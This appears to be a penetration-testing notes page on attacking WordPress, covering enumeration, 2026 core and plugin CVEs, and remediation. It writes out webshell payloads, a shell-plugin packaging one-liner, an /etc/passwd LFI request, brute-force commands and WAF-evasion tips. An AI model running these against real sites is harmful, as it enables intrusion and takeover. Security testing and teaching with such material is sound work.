+++
title = 'WordPress'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['web', 'web-technologies', 'wordpress', 'cms']
+++

WordPress powers over 40% of the web, and its attack surface is **three-layered**: the **core**, the **plugin/theme ecosystem**, and the **administrative session**. Historically, the plugin layer was the dominant risk; 2025–2026 changed that with **two unauthenticated core RCE chains** — **wp2shell** (CVE-2026-63030 + CVE-2026-60137) and **XSS2Shell** (CVE-2026-64638) — that work against **stock installations with zero plugins**. At the same time, **AI-augmented campaigns** (CyberXero, TRUST#GRAFT) are industrialising the exploitation of known WordPress flaws at scale.

| User Role | Description |
|---|---|
| **Administrator** | Full privileges — can manage plugins, themes, and users. **Direct path to RCE** via the theme/plugin editor. |
| **Editor** | Can publish and manage any user's posts — frequently has access to vulnerable plugins. |
| **Author** | Can publish and manage their own posts. |
| **Contributor** | Can write and manage their own posts, but cannot publish. |
| **Subscriber** | Can view posts and manage their profile — **a common target for privilege-escalation plugins**. |

> **2025–2026 shift:** a Subscriber account is no longer low-value. Multiple 2026 plugins allow **Subscriber → Administrator** escalation, and the Account Switcher plugin allows a Subscriber to **switch to any account, including Administrator**, with an empty secret parameter.

---

## 1. Discovery and Footprinting

### 1.1 Manual identification

```bash
# Version from the generator meta tag
curl -sk https://example.com | grep -i 'generator'

# Version from readme.html
curl -sk https://example.com/readme.html | grep -i 'version'

# Version from CSS/JS asset query strings
curl -sk https://example.com | grep -o '?ver=[0-9.]*'

# Core WordPress artifacts
curl -I https://example.com/wp-admin/
curl -I https://example.com/wp-content/
curl -I https://example.com/xmlrpc.php
curl -I https://example.com/wp-json/
curl -sk https://example.com/robots.txt | grep -i wp
```

### 1.2 WPScan

```bash
# Full passive enumeration — plugins, themes, users
wpscan --url https://example.com --enumerate p,t,u --plugins-detection passive

# Aggressive plugin detection — more traffic, more hits
wpscan --url https://example.com --enumerate p,t,u --plugins-detection aggressive

# With the API token — CVE data inline
wpscan --url https://example.com --enumerate vp --api-token TOKEN
```

> **Passive vs aggressive matters.** Passive detection parses the pages WordPress already serves; aggressive mode requests each plugin's `readme.txt` directly, which finds **deactivated** plugins but generates far more traffic and WAF noise.

### 1.3 Plugin enumeration — the `readme.txt` method

The most reliable plugin version check is the plugin's own `readme.txt`:

```bash
curl -s https://example.com/wp-content/plugins/<plugin>/readme.txt | grep "Stable tag"
```

**Directory existence check:**

```bash
curl -I https://example.com/wp-content/plugins/mail-masta
# 3xx redirect → plugin exists
# 404 → plugin not installed
```

> **This finds deactivated plugins** — an installed-but-inactive plugin still has a `readme.txt` and still carries its CVEs.

### 1.4 Theme enumeration

```bash
curl -s https://example.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' \
  | grep 'themes' | cut -d"'" -f2
```

---

## 2. User Enumeration

### 2.1 Author archive (`?author=`)

```bash
curl -s -I "https://example.com/?author=1"
# 301 → /author/admin/ → username is admin
```

### 2.2 REST API — the default disclosure

```bash
curl -s https://example.com/wp-json/wp/v2/users | jq
```

**WordPress leaks usernames through the author archive and the REST API by default**.

### 2.3 XML-RPC

`xmlrpc.php` exposes `system.multicall`, which lets an attacker **test hundreds of passwords in a single HTTP request** — the amplification that makes XML-RPC brute force practical.

```bash
# Confirm XML-RPC is enabled
curl -s -X POST https://example.com/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

> **XML-RPC brute force is loud** — Wordfence and modern WAFs detect it in seconds. Prefer the REST API or a slow, distributed spray.

### 2.4 Brute force with WPScan

```bash
sudo wpscan --password-attack xmlrpc -t 20 \
  -U admin,sfoffo -P /usr/share/wordlists/rockyou.txt \
  --url https://example.com
```

> **Lockout:** some instances lock an account after a few invalid attempts. Check the login error behaviour before committing to a wordlist.

---

## 3. Core Vulnerabilities — The 2026 Landscape

### 3.1 wp2shell — Unauthenticated RCE (CVE-2026-63030 + CVE-2026-60137)

**CVSS:** Critical. **Affected:** WordPress **6.9.0–6.9.4**, **7.0.0–7.0.1** (full RCE chain); **6.8.0–6.8.5** (SQLi only). **Zero plugins required**.

**The chain:**

1. **CVE-2026-63030 — REST batch route confusion (CWE-436).** `WP_REST_Server::serve_batch_request_v1()` appends to a `$matches[]` array by simple push, but **skips the append** when a sub-request's path fails to parse (e.g. a deliberately malformed `"http://:"` entry). That single skip **desynchronises the arrays**, so permission checks for one route are applied to a different route in the subsequent sub-request.

2. **CVE-2026-60137 — `author__not_in` SQL injection.** The parameter is not sanitised when supplied as an **unstructured scalar string**. Chained with the route confusion, the attacker reaches `WP_Query` with unsanitised input and injects SQL.

3. **Privilege escalation and RCE.** The SQL injection poisons the **object cache** (`get_post`), forces a **nested save** under a temporary administrative context, and **creates an administrator account** — which is then used to upload and execute a plugin or webshell.

**Detection and remediation:**

```bash
# Vulnerable versions
# 6.9.0 – 6.9.4  → upgrade to 6.9.5
# 7.0.0 – 7.0.1  → upgrade to 7.0.2
# 6.8.0 – 6.8.5  → upgrade to 6.8.6 (SQLi only)
```

**IOCs:** unusual requests to **`/wp-json/batch/v1`** with forced-error sub-requests; **new administrator accounts**; new PHP files in **`/wp-content/uploads/`** or **`/wp-content/plugins/`**.

> **wp2shell is being actively exploited in the wild.** Wiz Research confirmed exploitation, and the CyberXero campaign uses a custom `wp2shell` tool that abuses the REST API batch processor to inject SQL, plant a rogue admin, and drop a WSO-family webshell disguised as a plugin.

### 3.2 XSS2Shell — Reflected XSS → RCE (CVE-2026-64638)

**CVSS:** 8.9. **Affected:** all WordPress versions; fixed in **7.0.3** and backported to the **4.7** branch.

**The chain:**

1. An invalid username on the **login page** is reflected into the error message.
2. The value passes through multiple HTML sanitisation components that **disagree on malformed markup** — a parser differential lets attacker-controlled elements survive the first sanitisation step.
3. The surviving elements interact with **JavaScript WordPress already loads on the login page**, producing **reflected XSS without an account**.
4. Against a **logged-in administrator**, the XSS triggers same-origin REST requests and reaches **PHP code execution**.

> **It is not a zero-interaction RCE.** The official advisory states that escalation requires **social engineering and explicit victim interaction** — the attacker must get an authenticated administrator to load the login page with the malicious username.

**Remediation:** upgrade to **7.0.3** or the latest backport for the current branch.

### 3.3 Core CVE summary

| CVE | Type | Affected | Impact |
|---|---|---|---|
| **CVE-2026-63030** | REST batch route confusion | 6.9.0–6.9.4, 7.0.0–7.0.1 | Permission-check desync — the first half of wp2shell |
| **CVE-2026-60137** | SQL injection (`author__not_in`) | 6.8.0–6.8.5 (SQLi only); chain requires 6.9.x/7.0.x | Object-cache poisoning → admin creation |
| **CVE-2026-64638** | Reflected XSS → RCE | All versions before 7.0.3 | Admin-interaction RCE |

---

## 4. Admin User — Remote Code Execution

An administrator account can edit PHP code directly.

> **Theme/plugin editor caveat:** when editing an **active** theme or plugin, a syntax error can take the site down. Deactivate the target first, or use a **child theme** so the parent remains intact.

### 4.1 Manual — theme editor

1. Log in as administrator.
2. **Appearance → Theme File Editor → select a theme**.
3. Add `system($_GET[0]);` to a PHP file the theme loads.
4. Execute:

```bash
curl "https://example.com/wp-content/themes/THEMENAME/FILEPHPNAME.php?0=id"
```

### 4.2 Semi-automated — Metasploit

```text
use exploit/unix/webapp/wp_admin_shell_upload
```

### 4.3 Plugin upload

An administrator can upload a **malicious plugin ZIP** containing a PHP shell — no theme edit required, and no risk of breaking the active theme.

```bash
# Package a plugin
mkdir -p shellplugin && echo '<?php system($_GET["cmd"]); ?>' > shellplugin/shell.php
zip -r shellplugin.zip shellplugin/

# Upload via /wp-admin/plugin-install.php → Upload Plugin
# Then access: /wp-content/plugins/shellplugin/shell.php?cmd=id
```

> **The plugin-upload path is what wp2shell automates** after creating the rogue administrator — it is the final stage of the chain.

### 4.4 2026 context — admin session abuse (TRUST#GRAFT)

**TRUST#GRAFT** does **not need the administrator's password**. It is a **JavaScript-driven chain** that abuses an already-authenticated administrator's browser session:

1. The loader displays a **fake Cloudflare verification** screen and fingerprints the browser.
2. It retrieves a **WordPress nonce** from the live session.
3. It installs and activates a malicious plugin — **Web Media Optimizer 2.1** — through the **standard plugin-installation workflow**.
4. The plugin injects remote JavaScript, enables **administrator impersonation via a hardcoded token**, and persists in **`wp-content/mu-plugins/wmedia-recovery.php`**.

> **Remediation must remove the plugin, the mu-plugin, and the injected script** — deleting the visible plugin alone leaves the persistence in place.

---

## 5. Known Vulnerable Plugins — 2025–2026

The plugin ecosystem remains the **most common path to RCE**. The table below is the current high-impact set.

### 5.1 Unauthenticated RCE

| CVE | Plugin | Affected | Primitive |
|---|---|---|---|
| **CVE-2026-66047** | **ProfilePress** (`wp-user-avatar`) | < 4.17.2 | **Weak 32-bit connect token** brute-forced via `ppress_connect_process` → install and activate arbitrary plugins → PHP code execution |
| **CVE-2026-96349** | **SiteSkite** | ≤ 2.1.8 | Unauthenticated RCE, **CVSS 10.0**, CWE-94 — mass-exploit PoC available |
| **CVE-2025-8723** | **Cloudflare Image Resizing** | ≤ 1.5.6 | Unauthenticated **arbitrary PHP injection** into the codebase → RCE |
| **CVE-2025-8625** | **Copypress REST API** | 1.1–1.2 | **Hard-coded JWT signing key** → forge token → upload arbitrary PHP via `copyreap_handle_image()` |
| **CVE-2025-68015** | **Event Tickets with Ticket Scanner** | ≤ 2.8.5 | Unauthenticated RCE |
| **CVE-2026-4375** | **DoLeads Integrator / wp2epub** | ≤ 0.65 | Unauthenticated RCE via unclosed extensions from wordpress.org being installable by unauthorised users — **CVSS 9.0** |
| **GHSA-R262-F4QM-HRP9** | **WP Duplicate** | ≤ 1.1.8 | Missing authorisation → **arbitrary file upload** → unauthenticated auth bypass |

> **CVE-2026-66047 is the most instructive.** The "weak 32-bit token" is a **`Use of Insufficiently Random Values`** bug (CWE-330) combined with **`Missing Authentication for Critical Function`** (CWE-306) — the plugin's connect handler trusts a token that is small enough to brute-force, and the handler is reachable **before authentication**.

### 5.2 Privilege escalation — Subscriber → Administrator

| CVE | Plugin / Theme | Affected | Primitive |
|---|---|---|---|
| **CVE-2026-4261** | **Expire Users** | ≤ 1.2.2 | Subscriber can update the **`on_expire_default_to_role`** meta via `save_extra_user_profile_fields` → **Administrator** |
| **CVE-2026-6456** (GHSA-WRMC-3XQ2-8PF7) | **Account Switcher** | ≤ 1.0.2 | **Loose comparison** (`!=` not `!==`) on an empty secret + `permission_callback => '__return_true'` → **switch to any account, including Administrator** |
| **CVE-2025-13680** | **Tiger theme** | ≤ 101.2.1 | Subscriber → Administrator |
| **CVE-2025-15100** | **JAY Login & Register** | ≤ 2.6.03 | Subscriber → escalated privileges |
| **CVE-2026-16149** | **Security Hardener** | ≤ 2.4.4 | Missing authorisation → Subscriber creates a new **Administrator** |
| **CVE-2026-81274** | **Ditty** | ≤ 3.1.67 | **Subscriber broken access control** — administrative operations reachable |
| **CVE-2025-69332** | **Bookify** | ≤ 1.1.1 | Subscriber broken access control → elevated privileges |

> **The Account Switcher bug is a textbook PHP type-juggling flaw.** `get_user_meta()` returns an **empty string** when the meta does not exist; `'' != ''` is **false**, so the validation passes, and `wp_set_auth_cookie()` is called for the target user.

### 5.3 Legacy but still relevant

**Mail-Masta LFI:**

```bash
curl -s "https://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

**wpDiscuz RCE:**

```bash
python3 wp_discuz.py -u http://target -p /?p=1
# Then execute through the uploaded shell:
curl -s "http://target/wp-content/uploads/2021/08/<random>.php?cmd=id"
```

---

## 6. Modern Attack Chains (2025–2026)

### 6.1 CyberXero — AI-augmented WordPress exploitation

A 2026 campaign used **51 AI agents** to target WordPress sites and e-commerce platforms. Its custom tool, **`wp2shell`**, abuses the **REST API batch processor** to:

- inject SQL,
- plant a **rogue administrator** account,
- drop a **WSO-family webshell** disguised as a plugin.

The same campaign also exploited **CVE-2026-4815** — an SQL injection in the **Support Board** plugin.

> **The scaling is the story.** AI agents automate reconnaissance, payload selection, and exploitation across thousands of targets — the traditional "one site at a time" model no longer describes the threat.

### 6.2 REST API batch abuse

The wp2shell chain demonstrates that **`/wp-json/batch/v1` is a high-value endpoint** even when the core is patched:

- It accepts **multiple sub-requests** in one HTTP request.
- Route-resolution errors can **desynchronise** the permission-check array.
- Any plugin that registers a batch endpoint inherits the same risk.

**Detection:** monitor `/wp-json/batch/v1` for **forced-error sub-requests** and for **non-integer values in `author_exclude`**.

---

## 7. Tooling

| Tool | Purpose |
|---|---|
| **WPScan** | Core, plugin, theme, and user enumeration; CVE data with an API token |
| **BurpWpsScan** | Burp extension — XML-RPC/REST API exposure, user enumeration, plugin scanning |
| **`wpscan --password-attack xmlrpc`** | Amplified brute force via `system.multicall` |
| **Metasploit `wp_admin_shell_upload`** | Admin → shell |
| **`wp2shell-poc`** (sergiointel, Icex0) | SQLi → credential extraction → authenticated plugin upload → RCE; updated for **unauthenticated** RCE via `UNION SELECT` forging admin rows |
| **`searchsploit`** | Match plugin versions against ExploitDB |
| **`curl` + `readme.txt`** | Version fingerprinting for every installed plugin |

---

## 8. Testing Methodology

```text
1. Confirm WordPress and version
   - generator meta tag, readme.html, ?ver= strings

2. Enumerate
   - wpscan --enumerate p,t,u --plugins-detection passive
   - readme.txt for every discovered plugin (finds deactivated plugins)
   - /wp-json/wp/v2/users and ?author=1 for usernames

3. Core check — the 2026 priority
   - wp2shell: 6.9.0–6.9.4 / 7.0.0–7.0.1 → unauthenticated RCE
   - XSS2Shell: < 7.0.3 → login-page XSS → admin-interaction RCE
   - /wp-json/batch/v1 reachable?

4. Plugin check
   - Match every plugin version against the CVE tables in §5
   - ProfilePress, SiteSkite, Cloudflare Image Resizing, Copypress,
     Event Tickets, DoLeads/wp2epub, WP Duplicate

5. Privilege escalation check
   - With a Subscriber account: Expire Users, Account Switcher,
     Security Hardener, Ditty, Bookify

6. Admin RCE
   - Theme editor: system($_GET[0]);
   - Plugin upload: ZIP with a PHP shell

7. Post-exploitation
   - Check mu-plugins for persistence (TRUST#GRAFT pattern)
   - Check for rogue administrators
   - Check uploads/ and plugins/ for unexpected PHP
```

---

## 9. Field Notes

- **wp2shell changes the priority order.** On an unpatched 6.9.x/7.0.x site, **no plugins and no credentials are required** — check the core version **first**, before enumerating plugins.
- **XSS2Shell is not zero-click.** It requires an authenticated administrator to interact — but the initial XSS is pre-authentication and reachable from the login page.
- **Subscriber accounts are valuable in 2026.** Account Switcher (CVE-2026-6456) lets a Subscriber become Administrator with an **empty secret** — the loose comparison is the whole bug.
- **ProfilePress is the plugin to check first.** A **32-bit connect token** is brute-forceable, and the handler is **unauthenticated**.
- **`readme.txt` finds deactivated plugins.** A deactivated plugin still carries its CVEs and may still be reachable through its own endpoints.
- **REST API user enumeration is on by default.** `/wp-json/wp/v2/users` is the fastest username source.
- **XML-RPC brute force is loud.** Wordfence and modern WAFs detect it in seconds — prefer REST-based sprays.
- **Admin session abuse is the new persistence path.** TRUST#GRAFT installs a malicious plugin through the **administrator's own browser** and persists in **`mu-plugins`** — deleting the visible plugin is not enough.
- **AI-augmented campaigns are real.** CyberXero used **51 agents** and a custom wp2shell tool to industrialise WordPress exploitation — the scale is not manual.
- **Always check `mu-plugins`.** Must-use plugins load automatically and are frequently missed in cleanup.
